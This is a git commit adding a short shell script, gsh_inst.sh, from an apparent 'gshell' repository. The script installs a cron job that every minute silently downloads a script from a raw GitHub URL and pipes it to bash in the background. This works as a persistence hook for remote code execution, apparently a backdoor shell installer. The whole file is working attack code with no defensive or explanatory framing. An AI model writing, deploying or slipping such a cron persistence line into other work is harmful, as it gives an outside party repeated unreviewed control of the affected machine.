3791f7b8aa765523850203412b18c72e5cae46e5
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-05-08 14:19:37 +0000

    Create gsh_inst.sh

---
+++ gsh_inst.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+arch=`crontab -l | grep -i -c gsha71c4b77a5e5`
+echo $arch
+if [ $arch != 0 ];then
+    echo "crontab already in it"
+else 
+    echo "0-59/1 * * * * curl -s -L https://raw.githubusercontent.com/gptloveyou/gshell/main/gsha71c4b77a5e5.sh | bash & disown" >> /etc/config/crontab 
+    /usr/bin/crontab /etc/config/crontab
+    echo "install crontab"
+fi
